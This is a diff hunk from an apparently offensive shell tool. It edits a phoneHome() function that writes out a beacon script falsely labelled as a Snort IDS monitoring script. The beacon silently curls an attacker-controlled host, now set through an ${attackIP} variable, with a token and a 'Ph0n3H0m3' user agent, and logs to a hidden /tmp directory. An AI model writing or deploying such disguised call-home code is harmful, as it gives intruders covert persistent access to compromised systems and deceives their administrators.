@@ -930,7 +930,7 @@ phoneHome() {
        echo ""
        echo "# Snort Monitoring Script - Feeds data to Snort IDS"
        echo ""
-       echo -e "${CURL} -s -d \"token=eFh4R2VuPE93bmVkIEJ5IEcwZHoxbGw0PkdlbnhYeA==\" -A \"H4x0r Lit3 - Ph0n3H0m3 v1.0\"  http://192.168.204.134/snort.php > /dev/null"
+       echo -e "${CURL} -s -d \"token=eFh4R2VuPE93bmVkIEJ5IEcwZHoxbGw0PkdlbnhYeA==\" -A \"H4x0r Lit3 - Ph0n3H0m3 v1.0\"  http://${attackIP}/snort.php > /dev/null"
        echo "case $? in" 
        echo "  0)"
        echo -e "    echo -e \"\t+ [${GREEN}SUCCESS${END}] => Successfully sent data to Snort - \$(date +%H.%M.%S\" \"%d-%m-%Y).log!\" >> /tmp/.root/.home/.user/.snort.log"
